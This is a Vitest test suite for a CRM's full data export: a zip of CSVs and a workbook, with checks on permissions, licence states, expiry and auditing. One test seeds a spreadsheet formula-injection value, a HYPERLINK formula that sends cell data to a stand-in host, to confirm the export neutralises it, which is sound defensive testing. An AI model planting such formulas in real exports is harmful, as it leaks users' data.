import { generateKeyPairSync } from "node:crypto";
import { existsSync, mkdtempSync, readdirSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import archiver from "archiver";
import ExcelJS from "exceljs";
import { unzipSync, strFromU8 } from "fflate";
import Papa from "papaparse";
import { ALL_GRANTS, rawPublicKey, signLicence, type LicenceStateName } from "@lume/core";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { createHarness, type AuthedClient, type Harness } from "../../test/harness";
import { produceExport } from "./service";

const server = generateKeyPairSync("ed25519");
const INSTANCE = "LUME-TEST-0003";
const D = 24 * 3_600_000;

let h: Harness;
let admin: AuthedClient;
let rep: AuthedClient;
let repId: string;
let state: LicenceStateName = "active";

beforeAll(async () => {
  h = await createHarness({
    preset: "coaching",
    licence: {
      mode: "enforce",
      instanceId: INSTANCE,
      licenseKey: "LUME-KEY-0003",
      url: "https://licence.test",
      keys: { t1: rawPublicKey(server.publicKey) },
      version: "1.4.2",
      fetch: (async () =>
        new Response(
          JSON.stringify({
            token: signLicence(
              {
                v: 1,
                kid: "t1",
                instanceId: INSTANCE,
                state,
                licenseType: "subscription",
                issuedAt: h.clock.now.toISOString(),
                validUntil: new Date(h.clock.now.getTime() + 8 * D).toISOString(),
                paidUntil: "2026-09-01",
                trialEndsAt: null,
                reason: state === "active" ? "paid" : state === "suspended" ? "suspended" : "overdue",
                notice: null,
              },
              server.privateKey,
            ),
          }),
          { status: 200 },
        )) as typeof fetch,
    },
  });
  admin = await h.signIn(await h.seedUser({ grants: ALL_GRANTS, totp: true, name: "Maya Admin" }));
  const r = await h.seedUser({ grants: [{ key: "leads.view", scope: "own" }], name: "Riya Rep" });
  repId = r.id;
  rep = await h.signIn(r);
  await h.app.licence.check();
});
afterAll(() => h.close());

const become = async (s: LicenceStateName) => {
  state = s;
  await h.app.licence.check();
};
const download = async (c: AuthedClient = admin) => {
  const r = await c.inject({ method: "GET", url: "/api/v1/export" });
  return { r, files: r.statusCode === 200 ? unzipSync(new Uint8Array(r.rawPayload)) : {} };
};
const csv = (files: Record<string, Uint8Array>, name: string) =>
  Papa.parse<Record<string, string>>(strFromU8(files[name]!), { header: true, skipEmptyLines: true }).data;

describe("export all data (L-A Task 4)", () => {
  it("one zip: five CSVs and a workbook, named for the day", async () => {
    const { r, files } = await download();
    expect(r.statusCode).toBe(200);
    expect(r.headers["content-type"]).toBe("application/zip");
    expect(r.headers["content-disposition"]).toMatch(
      /attachment; filename="LUME-export-\d{4}-\d{2}-\d{2}\.zip"/,
    );
    expect(Object.keys(files).sort()).toEqual(
      ["LUME-export.xlsx", "activity.csv", "follow-ups.csv", "leads.csv", "notes.csv", "users.csv"].sort(),
    );
  });

  it("leads are complete and unmasked: contacts, stage, owner, tags, custom fields by their labels", async () => {
    const cfg = await h.config();
    const lead = await h.seedLead({
      ownerId: repId,
      name: "Exported Lead",
      phone: "+971501112233",
      email: "exported@leads.test",
    });
    const tag = (
      await admin.inject({ method: "POST", url: "/api/v1/tags", payload: { label: "Warm" } })
    ).json();
    await h.queryAll("INSERT INTO lead_tags (lead_id, tag_id) VALUES ($1, $2)", [
      lead,
      tag.tag?.id ?? tag.id,
    ]);
    const fieldKey = Object.keys(cfg.fields).find(
      (k) => !["name", "phone", "email", "instagram"].includes(k),
    );
    if (fieldKey)
      await h.queryAll(`UPDATE leads SET custom = jsonb_build_object($2::text, 'Some value') WHERE id = $1`, [
        lead,
        fieldKey,
      ]);
    await admin.inject({
      method: "POST",
      url: `/api/v1/leads/${lead}/notes`,
      payload: { body: "Called, keen." },
    });
    await admin.inject({
      method: "POST",
      url: `/api/v1/leads/${lead}/tasks`,
      payload: { title: "Send the brochure", due: { at: new Date(Date.now() + D).toISOString() } },
    });
    const { files } = await download();
    const row = csv(files, "leads.csv").find((l) => l.Name === "Exported Lead")!;
    expect(row).toMatchObject({
      Phone: "+971501112233",
      Email: "exported@leads.test",
      Owner: "Riya Rep",
      Tags: "Warm",
    });
    expect(row.Stage).toBeTruthy();
    expect(row["Lead ID"]).toBe(lead);
    const notes = csv(files, "notes.csv").filter((n) => n["Lead ID"] === lead);
    expect(notes).toEqual([expect.objectContaining({ Note: "Called, keen.", Author: "Maya Admin" })]);
    expect(csv(files, "follow-ups.csv").find((t) => t["Lead ID"] === lead)).toMatchObject({
      Title: "Send the brochure",
      Status: "open",
      "Assigned to": "Maya Admin",
    });
    expect(csv(files, "activity.csv").some((a) => a["Lead ID"] === lead)).toBe(true);
    expect(csv(files, "users.csv").map((u) => u.Name)).toEqual(
      expect.arrayContaining(["Maya Admin", "Riya Rep"]),
    );
    // The workbook holds the same, one sheet each.
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(files["LUME-export.xlsx"]!.buffer as ArrayBuffer);
    expect(wb.worksheets.map((w) => w.name)).toEqual(["Leads", "Notes", "Activity", "Follow-ups", "Users"]);
    const leadsSheet = wb.getWorksheet("Leads")!;
    const header = (leadsSheet.getRow(1).values as unknown[]).slice(1);
    const names = leadsSheet.getColumn(header.indexOf("Name") + 1).values as unknown[];
    expect(names).toContain("Exported Lead");
  });

  it("every lead, however many (read in batches)", async () => {
    const cfg = await h.config();
    await h.queryAll(
      `INSERT INTO leads (id, pipeline_id, stage_id, owner_id, name, phone_status)
       SELECT gen_random_uuid(), $1, $2, NULL, 'Bulk ' || n, 'missing' FROM generate_series(1, 2500) AS n`,
      [cfg.pipelineId, Object.values(cfg.stages)[0]],
    );
    const { files } = await download();
    expect(csv(files, "leads.csv").filter((l) => l.Name?.startsWith("Bulk ")).length).toBe(2500);
  });

  it("leads carry their source, product and external reference", async () => {
    const src = (
      await h.queryAll<{ id: string }>(
        "INSERT INTO lead_sources (id, type, name) VALUES (gen_random_uuid(), 'manual', 'Walk-ins') RETURNING id",
      )
    )[0]!.id;
    const product = (
      await h.queryAll<{ id: string }>(
        "INSERT INTO products (id, name) VALUES (gen_random_uuid(), 'Annual plan') RETURNING id",
      )
    )[0]!.id;
    const lead = await h.seedLead({ ownerId: null, name: "Sourced Lead" });
    await h.queryAll(
      "UPDATE leads SET source_id = $2, product_id = $3, external_ref = 'SHEET-42' WHERE id = $1",
      [lead, src, product],
    );
    const { files } = await download();
    expect(csv(files, "leads.csv").find((l) => l.Name === "Sourced Lead")).toMatchObject({
      Source: "Walk-ins",
      Product: "Annual plan",
      "External ref": "SHEET-42",
    });
  });

  it("a cell that a spreadsheet would run as a formula is kept as text", async () => {
    await h.seedLead({ ownerId: null, name: '=HYPERLINK("https://x.test/?"&B2,"Open")' });
    const { files } = await download();
    const text = strFromU8(files["leads.csv"]!);
    expect(text).not.toMatch(/(^|,)"?=HYPERLINK/m);
    expect(csv(files, "leads.csv").some((l) => l.Name === `'=HYPERLINK("https://x.test/?"&B2,"Open")`)).toBe(
      true,
    );
  });

  it("a deleted lead's notes, activity and follow-ups leave with it, as leads.csv does", async () => {
    const lead = await h.seedLead({ ownerId: repId, name: "Deleted Lead" });
    await admin.inject({ method: "POST", url: `/api/v1/leads/${lead}/notes`, payload: { body: "Gone." } });
    await admin.inject({
      method: "POST",
      url: `/api/v1/leads/${lead}/tasks`,
      payload: { title: "Never mind", due: { at: new Date(Date.now() + D).toISOString() } },
    });
    await h.queryAll("UPDATE leads SET deleted_at = now() WHERE id = $1", [lead]);
    const { files } = await download();
    expect(csv(files, "leads.csv").some((l) => l["Lead ID"] === lead)).toBe(false);
    for (const f of ["notes.csv", "activity.csv", "follow-ups.csv"])
      expect(
        csv(files, f).some((r) => r["Lead ID"] === lead),
        f,
      ).toBe(false);
  });

  it("prepared on the server, then downloaded by the browser itself: once, only by who asked", async () => {
    for (const s of ["active", "suspended"] as const) {
      await become(s);
      const p = await admin.inject({ method: "POST", url: "/api/v1/export" });
      expect(p.statusCode, s).toBe(200);
      const { id, name } = p.json<{ id: string; name: string }>();
      expect(name).toMatch(/^LUME-export-\d{4}-\d{2}-\d{2}\.zip$/);
      const other = await h.signIn(await h.seedUser({ grants: ALL_GRANTS, totp: true, name: `Omar ${s}` }));
      expect((await other.inject({ method: "GET", url: `/api/v1/export/${id}` })).statusCode).toBe(404);
      const r = await admin.inject({ method: "GET", url: `/api/v1/export/${id}` });
      expect(r.statusCode).toBe(200);
      expect(r.headers["content-disposition"]).toBe(`attachment; filename="${name}"`);
      expect(Object.keys(unzipSync(new Uint8Array(r.rawPayload)))).toContain("leads.csv");
      // Again, until it expires (a cancelled Save As, a second click): the same zip.
      expect((await admin.inject({ method: "GET", url: `/api/v1/export/${id}` })).statusCode).toBe(200);
    }
    await become("active");
    expect((await rep.inject({ method: "POST", url: "/api/v1/export" })).statusCode).toBe(403);
  });

  it("a prepared export lasts 10 minutes, then it and its file are gone", async () => {
    const { id } = (await admin.inject({ method: "POST", url: "/api/v1/export" })).json<{ id: string }>();
    expect(readdirSync(tmpdir()).filter((f) => f.includes(id))).toHaveLength(1);
    vi.useFakeTimers({ toFake: ["Date"], now: Date.now() + 11 * 60_000 });
    try {
      expect((await admin.inject({ method: "GET", url: `/api/v1/export/${id}` })).statusCode).toBe(404);
    } finally {
      vi.useRealTimers();
    }
    await vi.waitFor(() => expect(readdirSync(tmpdir()).filter((f) => f.includes(id))).toEqual([]));
  });

  it("asked over real HTTP with a body (a script's -d '{}'), the export still prepares and answers", async () => {
    // inject() doesn't close the request the way a socket does: this needs the real server.
    await h.app.listen({ port: 0, host: "127.0.0.1" });
    const port = (h.app.server.address() as import("node:net").AddressInfo).port;
    const r = await fetch(`http://127.0.0.1:${port}/api/v1/export`, {
      method: "POST",
      headers: {
        ...admin.headers,
        "content-type": "application/json",
        cookie: Object.entries(admin.cookies)
          .map(([k, v]) => `${k}=${v}`)
          .join("; "),
      },
      body: "{}",
      signal: AbortSignal.timeout(20_000),
    });
    expect(r.status).toBe(200);
    expect(await r.json()).toHaveProperty("id");
  });

  it("exports an earlier run left behind (an API restart) are cleared at start", async () => {
    const { sweepLeftExports } = await import("./service");
    const dir = mkdtempSync(path.join(tmpdir(), "lume-exports-"));
    const old = path.join(dir, "lume-export-0123abcd.zip");
    const fresh = path.join(dir, "lume-export-4567cdef.zip");
    writeFileSync(old, "x");
    writeFileSync(fresh, "x");
    utimesSync(old, new Date(Date.now() - 20 * 60_000), new Date(Date.now() - 20 * 60_000));
    await sweepLeftExports(dir);
    expect(existsSync(old)).toBe(false);
    expect(existsSync(fresh)).toBe(true);
  });

  it("a download abandoned half way lets go of its database connection", async () => {
    const zip = archiver("zip", { zlib: { level: 0 }, highWaterMark: 1024 });
    // Nobody reads the zip: the export stalls on its first full buffer, as a closed browser leaves it.
    const ac = new AbortController();
    const done = produceExport({ pool: h.pool, userId: repId, zip, signal: ac.signal, log: h.app.log });
    await new Promise((r) => setTimeout(r, 500));
    // Asked as the same role, so its sessions' states are visible.
    const idleInTx = async () =>
      (
        await h.pool.query<{ n: number }>(
          "SELECT count(*)::int AS n FROM pg_stat_activity WHERE datname = current_database() AND state = 'idle in transaction'",
        )
      ).rows[0]!.n;
    expect(await idleInTx()).toBeGreaterThanOrEqual(1);
    ac.abort();
    await Promise.race([
      done,
      new Promise((_, no) => setTimeout(() => no(new Error("still waiting")), 5000)),
    ]);
    expect(await idleInTx()).toBe(0);
  });

  it("works in every licence state — clients always get their data out", async () => {
    for (const s of ["grace", "read_only", "suspended"] as const) {
      await become(s);
      const { r, files } = await download();
      expect(r.statusCode, s).toBe(200);
      expect(Object.keys(files)).toContain("leads.csv");
    }
    await become("active");
  });

  it("is for people allowed to export everything, and it's audited", async () => {
    expect((await rep.inject({ method: "GET", url: "/api/v1/export" })).statusCode).toBe(403);
    await download();
    const rows = await h.queryAll<{ action: string }>(
      "SELECT action FROM audit_log WHERE action = 'data.export'",
    );
    expect(rows.length).toBeGreaterThanOrEqual(1);
  });
});
